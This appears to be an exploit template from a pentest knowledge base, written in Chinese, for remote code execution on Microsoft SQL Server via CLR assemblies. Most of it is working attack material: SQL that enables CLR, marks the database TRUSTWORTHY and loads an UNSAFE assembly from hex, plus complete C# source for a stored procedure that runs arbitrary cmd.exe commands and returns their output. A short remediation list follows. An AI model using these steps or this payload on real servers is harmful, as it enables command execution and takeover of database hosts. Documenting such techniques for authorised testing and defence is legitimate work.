---
id: MSSQL-CLR-RCE
title: "MSSQL - CLR Assembly 远程代码执行"
product: mssql
vendor: Microsoft
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, clr, 需要认证]
fingerprint: ["Microsoft SQL Server"]
---

## 漏洞描述

当 MSSQL 的 xp_cmdshell 和 OLE Automation 都被限制时，攻击者可以利用 CLR（Common Language Runtime）集成功能加载恶意 .NET Assembly 来执行操作系统命令。CLR Assembly 可以直接从十六进制字节码加载，无需落地文件，隐蔽性强。需要 sysadmin 权限开启 CLR 并设置数据库为 TRUSTWORTHY。

## 影响版本

- 所有支持 CLR 的 MSSQL 版本（SQL Server 2005+）

## 前置条件

- sysadmin 权限（如 sa 账号）
- 能够修改数据库 TRUSTWORTHY 属性

## 利用步骤

```sql
-- 开启 CLR
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;

-- 创建 Assembly（从十六进制加载，无需落地文件）
CREATE ASSEMBLY [cmd_exec]
FROM 0x4D5A900003000000...  -- CLR DLL 的十六进制编码
WITH PERMISSION_SET = UNSAFE;

-- 创建存储过程
CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(MAX)
AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];

-- 执行命令
EXEC cmd_exec 'whoami';
```

## Payload

CLR DLL 需要预先编译，可使用以下 C# 代码生成：

```csharp
using System;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
};
```

编译后使用 `xxd -p` 或 PowerShell 转为十六进制嵌入 SQL 语句。

## 修复建议

1. 禁用 CLR 集成（`sp_configure 'clr enabled', 0`）
2. 不将数据库设置为 TRUSTWORTHY
3. 限制 sysadmin 角色成员
4. 启用审计日志监控 Assembly 创建事件
5. 使用最小权限原则配置数据库账号
